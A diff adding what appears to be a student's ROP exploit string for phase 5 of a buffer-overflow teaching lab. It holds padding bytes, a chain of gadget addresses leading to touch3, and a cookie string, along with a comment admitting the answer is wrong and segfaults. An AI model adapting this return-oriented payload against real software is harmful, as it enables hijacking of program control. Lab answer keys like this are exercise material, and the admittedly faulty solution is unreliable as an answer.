@@ -1,0 +1,25 @@
+/* 
+Another solution for phase5, use %rdi = 0x30(not always, but most of times), 
+I know is a wrong answer, but a lot of times it correctly call touch3 with true string address like:
+Breakpoint 10, touch3 (sval=0x7ffffffd6d80 "59b997fa") at visible.c:71
+But after that it always cause a segmentation fault and I don't know why.
+The code seems good if %rdi = 0x30. 
+*/
+
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* (first return address): */
+06 1a 40 00 00 00 00 00 /* gadget1: mov %rsp, %rax -> ret */
+a2 19 40 00 00 00 00 00 /* gadget2: mov %rax, %rdi -> ret */
+d6 19 40 00 00 00 00 00 /* gadget9: lea (%rdi,%rsi,1),%rax -> ret */
+a2 19 40 00 00 00 00 00 /* gadget2: mov %rax, %rdi -> ret */
+fa 18 40 00 00 00 00 00 /* return to touch3(4018fa): */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+35 39 62 39 39 37 66 61 /* string address: gadget1_rsp + 0x30 */
+00
